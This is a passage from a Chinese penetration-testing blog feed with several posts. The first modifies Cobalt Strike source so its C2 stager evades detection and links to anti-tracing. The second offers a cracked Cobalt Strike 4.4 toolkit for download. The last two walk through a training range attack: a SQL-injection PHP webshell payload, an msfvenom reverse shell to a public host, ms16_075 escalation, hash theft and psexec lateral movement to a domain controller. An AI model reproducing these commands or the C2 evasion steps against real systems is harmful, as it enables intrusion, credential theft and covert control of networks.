<p>接下来我们会看到3个错误，这个错误就是表示重复引用了某个字符，解决也简单 直接<strong>删除</strong>，如图</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202031858235.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202032326629.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202032447089.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202032628758.png" alt=""></p>
</blockquote>
<p>编译不出错的不用管这个，这3错误搞完就可以编译了，输出目录在<strong>D:\cs\out\artifacts\cs_jar</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202033046780.png" alt=""></p>
</blockquote>
<p>改完这一个他们通过原本的特征无法检测到你了，但是你只改这一个的话是无法上线的，你可以在c2文件中吧请求的url改成<strong>ds6f565sdf44s65d4f21dsf1.jpg</strong>或者跟我进行下一步</p>
<blockquote>
<p>解释一下：CommonUtils对应的就是你小马20kb会主动访问服务器下载stage的，你得改对访问路径，相应是我们上面生成的</p>
</blockquote>
<p>接下来改上线，没错就是这个 <strong>CommonUtils.java</strong>文件 但是注意别改错文件了 改<strong>src</strong>文件夹里面的 <strong>CommonUtils.java</strong>文件，我们打开他，还是老样子，搜索<strong>checksum8</strong>字符定位到相关代码附近</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202034105211.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202034331193.png" alt=""></p>
</blockquote>
<p>把这俩结果更改为你的随机字符串 我这里是<strong>return “ds6f565sdf44s65d4f21dsf1.jpg”;和return “ds78d4fg4er784gdfg4df9g4d8g4.jpg”;</strong>到时候的成品我也会有打包，不会的可以替换过渡一下</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211203000928306.png" alt=""></p>
</blockquote>
<p>接着构建工件，构建完成了， 接下来开始测试</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211203001153734.png" alt=""></p>
</blockquote>
<h1 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h1><p><strong>在D:\cs\out\artifacts\cs_jar找打了咱们编译好的文件 ，打开压缩包把cs.jar\cs\WebServer.class和WebServer$WebListener.class还有cs.jar\common\CommonUtils.class和CommonUtils$1.class文件移动到到你原本的cobaltstrike.jar文件里对应目录</strong></p>
<blockquote>
<p><strong>问：</strong>为什莫么不直接用生成的cs.jar文件</p>
<p><strong>答：</strong>可以直接用 但是需要修改teamserver所有相关cobaltstrike.jar的名称并且有一些启动的汉化包什么的也需要改，不能直接重命名，直接重命名是无法打开的，可能是包的名字写到了java文件里，我也不是很清楚，我这里直接重命名失败了，并且很容易出错。</p>
</blockquote>
<p><strong>过程很顺利， 没有丝毫错误，然后启动咱们的cs团队服务器，在启动客户端测试之前测试的链接</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202035246837.png" alt=""></p>
</blockquote>
<p>再次访问特征处是无法下载的，如图看流程</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202041129553.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202041238148.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202040955768.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202041339028.png" alt=""></p>
</blockquote>
<p>结果就是可以直接通过我们设置对应的路径进行上线了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211203074123667.png" alt=""></p>
</blockquote>
<p>注意一点：我中途是遇到过坑的，所以可能有些数值对不上，望请谅解</p>
<p><strong>可以看到是原来默认的是完全访问不了了的直接就是404状态，并且cs也是可以上线的，到这里就结束了，希望我的教程可以帮助到您，谢谢您的观看！！！</strong></p>
<blockquote>
<p><strong>超详细过程改checksum8武装cs完成，下篇讲如何防溯源，经过测试vultr并没有再检测出我的teamserver的监听特征</strong></p>
</blockquote>
<h3 id="获取我文中部分素材请公众号回复”2021-12-03“获取"><a href="#获取我文中部分素材请公众号回复”2021-12-03“获取" class="headerlink" title="获取我文中部分素材请公众号回复”2021-12-03“获取"></a>获取我文中部分素材请公众号回复”2021-12-03“获取</h3><h1 id="个人博客"><a href="#个人博客" class="headerlink" title="个人博客"></a><a href="https://gylq.gitee.io/">个人博客</a></h1>]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>二次开发</tag>
      </tags>
  </entry>
  <entry>
    <title>【武器库】图形化渗透测试武器库_GUI_Tools（包含去暗桩CS4.4）</title>
    <url>/posts/175.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>包含多种漏洞利用以及webshell集成工具</li>
</ul>
</blockquote>
<h1 id="一、启动界面"><a href="#一、启动界面" class="headerlink" title="一、启动界面"></a>一、启动界面</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211026210415244.png" alt="image-20211026210415244"></p>
</blockquote>
<h1 id="二、安装过程方法在压缩之后目录中也会写"><a href="#二、安装过程方法在压缩之后目录中也会写" class="headerlink" title="二、安装过程方法在压缩之后目录中也会写"></a>二、安装过程方法在压缩之后目录中也会写</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">pip install -U wxPython <span class="comment"># python3.x 安装一个依赖</span></span><br><span class="line">python GUI_Tools.py  <span class="comment"># 直接python3.x 执行</span></span><br></pre></td></tr></table></figure></div>

<h1 id="三、插件及其目录形式"><a href="#三、插件及其目录形式" class="headerlink" title="三、插件及其目录形式"></a>三、插件及其目录形式</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211026210725476.png" alt="image-20211026210725476"></p>
</blockquote>
<h1 id="四、CS4-4无暗桩并win下执行测试"><a href="#四、CS4-4无暗桩并win下执行测试" class="headerlink" title="四、CS4.4无暗桩并win下执行测试"></a>四、CS4.4无暗桩并win下执行测试</h1><p><strong>1、压缩后进入<code>CobaltStrike4.4（汉化+Win下Teamserver）</code>目录下，有一个<code>teamserver.bat</code></strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211026210859600.png" alt="image-20211026210859600"></p>
</blockquote>
<p><strong>2、在管理员权限权限下的当前目录命令框中输入如下命令打开windows下的teamserver</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">teamserver.bat 192.168.43.69 123456 havex.profile</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211026211158765.png" alt="image-20211026211158765"></p>
<p><strong>3、CS4.4登陆方法</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211026211326456.png" alt="image-20211026211326456"></p>
</blockquote>
<p><strong>4、接着就成功登陆了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211026211409896.png" alt="image-20211026211409896"></p>
</blockquote>
<p>下面就不演示了  懂得都懂</p>
<h1 id="五、下载地址"><a href="#五、下载地址" class="headerlink" title="五、下载地址"></a>五、下载地址</h1><blockquote>
<p>百度云下载地址：</p>
<p>链接: <a href="https://pan.baidu.com/s/1jWKrpngtfAziZvMtfKxMlA" target="_blank" rel="noopener">https://pan.baidu.com/s/1jWKrpngtfAziZvMtfKxMlA</a> 提取码: ujhp</p>
<p>解压密码：gylq.gitee.io</p>
<p>挂链补公众号回复：20211027</p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】Cobalt strike自动化拿域控</title>
    <url>/posts/131.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场内网渗透，练练手！</li>
</ul>
</blockquote>
<h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><blockquote>
<p>环境：<a href="http://afsgr16-b1ferw.aqlab.cn/?id=1" target="_blank" rel="noopener">http://afsgr16-b1ferw.aqlab.cn/?id=1</a></p>
<p>工具：CobaltStrike 3.14 学习</p>
<p>最近学习CobaltStrike，所以写一篇关于CobaltStrike的姿势</p>
</blockquote>
<p>上篇文章都讲过了就不赘述了，拿到shell上蚁剑</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;afsgr16-b1ferw.aqlab.cn&#x2F;?id&#x3D;1.1 union select 1,&quot;&lt;?php eval($_REQUEST[gylq]);?&gt;&quot;  into outfile &#39;C:&#x2F;phpstudy&#x2F;www&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825125125629.png" alt="image-20210825125125629"></p>
</blockquote>
<p>②蚁剑连接，发现权限很低</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825125351402.png" alt="image-20210825125351402"></p>
</blockquote>
<h1 id="CobaltStrike超简单拿域控"><a href="#CobaltStrike超简单拿域控" class="headerlink" title="CobaltStrike超简单拿域控"></a>CobaltStrike超简单拿域控</h1><p>由于大部分师傅可能都不知道CobaltStrike是啥，我说一下怎么开teamserver，和启动CobaltStrike，具体原理请百度</p>
<h2 id="一、启动CobaltStrike"><a href="#一、启动CobaltStrike" class="headerlink" title="一、启动CobaltStrike"></a>一、启动CobaltStrike</h2><p><strong>1、先将CobaltStrike放入kali中，然后启动teamserve命令</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver 192.168.1.105 123456</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910190706634.png" alt="image-20210910190706634"></p>
</blockquote>
<p><strong>2、在我的电脑中启动CobaltStrike，连上50050端口密码123456，主机是我们刚刚设置的ip地址也就是kali的ip地址，具体看图</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910190843123.png" alt="image-20210910190843123"></p>
</blockquote>
<h2 id="二、脚本web传递拿beacon"><a href="#二、脚本web传递拿beacon" class="headerlink" title="二、脚本web传递拿beacon"></a>二、脚本web传递拿beacon</h2><p>1、打开监听器，反弹http的beacon，监听我们内网穿透的端口和地址</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191104374.png" alt="image-20210910191104374"></p>
</blockquote>
<p><strong>2、在攻击里面找到脚本web传递</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191004064.png" alt="image-20210910191004064"></p>
</blockquote>
<p>2、按图设置</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191134314.png" alt="image-20210910191134314"></p>
</blockquote>
<p>3、将生成的代码保存起来</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191211759.png" alt="image-20210910191211759"></p>
</blockquote>
<p>4、在蚁剑中执行这段代码就可以拿到shell了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191237891.png" alt="image-20210910191237891"></p>
</blockquote>
<p><strong>5、接着CobaltStrike自动就上线了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191330778.png" alt="image-20210910191330778"></p>
</blockquote>
<p><strong>6、提权就成功了选择自己一开始的监听器</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191401692.png" alt="image-20210910191401692"></p>
</blockquote>
<p><strong>7、接着就反弹一个system的beacon</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191440237.png" alt="image-20210910191440237"></p>
</blockquote>
<p>8、这里可以转到msf探测一下C段，但是我们已经知道10.0.1.8这个ip，可以直接hash传递得到beacon，先制作一个令牌</p>
<p>①先hashdump导出hash</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191706672.png" alt="image-20210910191706672"></p>
</blockquote>
<p>②制作令牌就会自动获取我们刚刚导入的hash</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191725856.png" alt="image-20210910191725856"></p>
</blockquote>
<p>③记得选择admin开头的接着令牌就成功了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910191929958.png" alt="image-20210910191929958"></p>
</blockquote>
<p><strong>9、利用令牌直接hash传递拿到10.0.1.8这台机子的system权限</strong></p>
<p>①设置一个监听直连smb，端口随意</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192200382.png" alt="image-20210910192200382"></p>
</blockquote>
<p>②执行下面命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">psexec_psh 10.0.1.8 smb-beacon</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192238867.png" alt="image-20210910192238867"></p>
</blockquote>
<p>③接着10.0.1.8这台机子就上线了，smb形式就是445端口</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192308245.png" alt="image-20210910192308245"></p>
</blockquote>
<h2 id="三、拿域控之前的CobaltStrike命令积累学习"><a href="#三、拿域控之前的CobaltStrike命令积累学习" class="headerlink" title="三、拿域控之前的CobaltStrike命令积累学习"></a>三、拿域控之前的CobaltStrike命令积累学习</h2><p><strong>由于我们知道域控机子ip就是10.0.1.6，上篇文章讲过了，就不复述的去实践扫描了，直接开始命令学习</strong></p>
<p>1、查看当前用户组</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell whoami&#x2F;groups</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192520024.png" alt="image-20210910192520024"></p>
</blockquote>
<p>2、查看域</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net view &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192559695.png" alt="image-20210910192559695"></p>
</blockquote>
<p>3、枚举域内主机</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net view &#x2F;domain:GYLQ</span><br><span class="line">shell net group &quot;domain Computers&quot; &#x2F;domain #这个也可以</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192730087.png" alt="image-20210910192730087"></p>
</blockquote>
<p>4、查看DC域控主机</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain Controllers&quot; &#x2F;domain</span><br><span class="line">shell nltest&#x2F;dclist:GYLQ #也可以</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192947731.png" alt="image-20210910192947731"></p>
</blockquote>
<p>5、查看DC的ip</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910192836844.png" alt="image-20210910192836844"></p>
</blockquote>
<p>6、查看域的信任关系</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910193026550.png" alt="image-20210910193026550"></p>
</blockquote>
<p>7、powershell导入power-view模块，去github找一个<strong>powertools</strong>，这部分只是学习命令，可以跳过</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910193230115.png" alt="image-20210910193230115"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell Invoke-ACLScanner &#x2F;&#x2F;查看域的信息</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910193456464.png" alt="image-20210910193456464"></p>
</blockquote>
<p>2、查看共享文件夹情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell Invoke-ShareFinder</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910193617172.png" alt="image-20210910193617172"></p>
</blockquote>
<h2 id="四、CobaltStrike自动化拿域控？"><a href="#四、CobaltStrike自动化拿域控？" class="headerlink" title="四、CobaltStrike自动化拿域控？"></a>四、CobaltStrike自动化拿域控？</h2><p>上面的漫长的废话搞完了，接下来实操。</p>
<p>1、打开文件管理，看到域控有登陆过这台机子，刚好我们换成域控权限，PID是1796</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910193935194.png" alt="image-20210910193935194"></p>
</blockquote>
<p>2、盗取token</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910194011043.png" alt="image-20210910194011043"></p>
</blockquote>
<p>3、利用共享文件夹发现可以访问域控的C盘了，这时能拿域控的方法太多，我随便选一个</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910194043684.png" alt="image-20210910194043684"></p>
</blockquote>
<p>4、直接用拿10.0.1.8的方法拿10.0.1.6，简直不要太简单了好吧，我上篇文章还要转来转去，接着DC就上线了。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">psexec_psh 10.0.1.6 smb-beacon</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910194754682.png" alt="image-20210910194754682"></p>
</blockquote>
<p>5、怎么进人域控的桌面，接着挂个socks代理</p>
<p>①进入这里</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910195125669.png" alt="image-20210910195125669"></p>
</blockquote>
<p>②接着socks1080</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910195149475.png" alt="image-20210910195149475"></p>
</blockquote>
<p>③然后将其中的一个管理员的密码改成testTEST123</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910195456209.png" alt="image-20210910195456209"></p>
</blockquote>
<p>④利用proxychains4代理连上去，不懂看上篇文章，写的很详细</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 rdesktop -u administrator -p woshifengge1. 10.0.1.8</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910195641421.png" alt="image-20210910195641421"></p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>最近学了CobaltStrike才知道这就点几下就拿域控了，不需要复杂的命令。下次加油。</p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>提权</tag>
        <tag>封神台</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】内网渗透-拿域控</title>
    <url>/posts/118.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场内网渗透，练练手！</li>
</ul>
</blockquote>
<h1 id="内网渗透拿域控"><a href="#内网渗透拿域控" class="headerlink" title="内网渗透拿域控"></a>内网渗透拿域控</h1><blockquote>
<p>环境：<a href="http://afsgr16-b1ferw.aqlab.cn/?id=1" target="_blank" rel="noopener">http://afsgr16-b1ferw.aqlab.cn/?id=1</a></p>
</blockquote>
<p>1、进去一看，典型的sql注入</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825220657141.png" alt="image-20210825220657141"></p>
</blockquote>
<p><strong>2、测试了一下，可以爆库，也可以写一句话，并且还爆了绝对路径，直接拿shell，进入主题</strong></p>
<p>①将shell.php写入网站根目录，payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//afsgr16-b1ferw.aqlab.cn/?id=1.1 union select 1,"<span class="meta">&lt;?php</span> eval($_REQUEST[gylq]);<span class="meta">?&gt;</span>"  into outfile 'C:/phpstudy/www/shell.php'</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825125125629.png" alt="image-20210825125125629"></p>
</blockquote>
<p>②蚁剑连接，发现权限很低</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825125351402.png" alt="image-20210825125351402"></p>
</blockquote>
<h1 id="kali机的提权和后渗透方法"><a href="#kali机的提权和后渗透方法" class="headerlink" title="kali机的提权和后渗透方法"></a>kali机的提权和后渗透方法</h1><p>提权我们可以传个木马用msf试试，获取按照系统补丁来搜payload提权等等，这里就用最快的方式，msf（注意：，下面讲关于kali中msf怎么内网穿透，方法太多了）</p>
<h2 id="kali内网穿透用花生壳"><a href="#kali内网穿透用花生壳" class="headerlink" title="kali内网穿透用花生壳"></a>kali内网穿透用花生壳</h2><p>拿到webshell之后，由于这个webshell是在公网的，无法访问我们内网的kali，所以我们得将kali中的某个端口映射到公网</p>
<p>下载<a href="https://console.hsk.oray.com/accounts" target="_blank" rel="noopener">花生壳</a></p>
<p><strong>1、可以看到kali的内网ip为<code>192.168.0.108</code></strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825144201133.png" alt="image-20210825144201133"></p>
</blockquote>
<p><strong>2、接着设置一下花生壳的配置</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825144304538.png" alt="image-20210825144304538"></p>
</blockquote>
<p><strong>3、可以看到我们映射到公网的ip和端口</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825145021884.png" alt="image-20210825145021884"></p>
</blockquote>
<p><strong>4、接着使用msf制作访问我们公网ip和端口的后门</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;103.46.128.46 LPORT&#x3D;26240 -f exe &gt; payload.exe</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825145308619.png" alt="image-20210825145308619"></p>
</blockquote>
<p><strong>4、打开msf的监听</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">handler -x -H 192.168.0.108 -P 6666 -p windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">或者使用</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.0.108</span><br><span class="line">set lport 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825145611133.png" alt="image-20210825145611133"></p>
</blockquote>
<p><strong>5、执行webshell中的木马</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825150817771.png" alt="image-20210825150817771"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sessions 1 &#x2F;&#x2F;进入会话</span><br></pre></td></tr></table></figure></div>

<p><strong>6、发现无法不是最高权限，getsystem/getprivs并未成功</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825151006342.png" alt="image-20210825151006342"></p>
</blockquote>
<p><strong>7、一般使用最多的是ms16_075的方式提权了，这个成功率高，试试</strong></p>
<p>但是由于我们是内网，所以就必须准备两个msf窗口才能使用msf的提取功能</p>
<p>①<strong>msf窗口1执行监听命令</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825190615237.png" alt="image-20210825190615237"></p>
</blockquote>
<p>②<strong>msf窗口2权限低的那个会话执行提权命令</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy lhost&#x3D;103.46.128.46 lport&#x3D;26240</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825152946894.png" alt="image-20210825152946894"></p>
</blockquote>
<p>③<strong>接着监听的那个msf窗口1就获得了一个system权限的会话</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825190550083.png" alt="image-20210825190550083"></p>
</blockquote>
<p>看路由器命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825131602886.png" alt="image-20210825131602886"></p>
</blockquote>
<p>一般为了防止后门被人关掉，将其注入到其他程序中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ps 查看进程pid</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825131738407.png" alt="image-20210825131738407"></p>
</blockquote>
<p>接着用migrate将我们后门注入到1816中，有效防止木马挂了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">migrate 1816</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825131844343.png" alt="image-20210825131844343"></p>
</blockquote>
